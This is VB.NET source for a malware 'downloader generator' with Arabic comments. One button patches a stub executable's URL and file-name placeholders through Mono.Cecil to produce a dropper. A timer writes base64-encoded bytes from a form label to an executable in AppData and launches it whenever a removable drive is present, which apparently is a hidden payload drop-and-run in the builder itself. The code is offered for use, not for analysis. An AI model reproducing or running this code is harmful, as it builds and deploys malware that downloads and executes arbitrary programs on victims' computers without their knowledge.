Imports System.IO
Imports Mono.Cecil
Imports Mono.Cecil.Cil
Public Class Form1
    Public Stub As String
    Public Save As New SaveFileDialog
    Public Path1 As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\Teest New Server WirteAllBytes.exe"
    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Stub = Application.StartupPath & "\Stub.exe" ' أسم الستب
        Dim asm As AssemblyDefinition = AssemblyDefinition.ReadAssembly(Stub)
        Dim tdf As TypeDefinition
        For Each tdf In asm.MainModule.GetTypes
            Dim mdf As MethodDefinition
            For Each mdf In tdf.Methods
                If (mdf.Name = ".cctor") Then
                    Dim enm As IEnumerator(Of Instruction) = Nothing
                    Try
                        enm = mdf.Body.Instructions.GetEnumerator
                        Do While enm.MoveNext
                            Dim current As Instruction = enm.Current
                            If (current.OpCode.Code = Code.Ldstr) Then
                                Dim strings As String = current.Operand.ToString
                                If (strings = "[URL]") Then current.Operand = TextBox1.Text ' textbox1 = الرأبط المُباشر
                                If (strings = "[Exe]") Then current.Operand = TextBox2.Text ' textbox2 = أسم الملف عند النزول
                            End If
                        Loop
                    Finally
                        enm.Dispose()
                    End Try
                End If
            Next
        Next
        With Save
            .FileName = "Downloder"
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                asm.Write(Save.FileName)
            End If
        End With
        MessageBox.Show("Downloder Generetor Done!")
    End Sub
    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        For Each Driver In DriveInfo.GetDrives()
            If Driver.DriveType = DriveType.Removable Then
                File.WriteAllBytes(Path1, Convert.FromBase64String(Label4.Text))
                Threading.Thread.Sleep(1000)
                Process.Start(Path1)
                Timer1.Stop()
                Timer1.Enabled = False
            End If
        Next
    End Sub
End Class
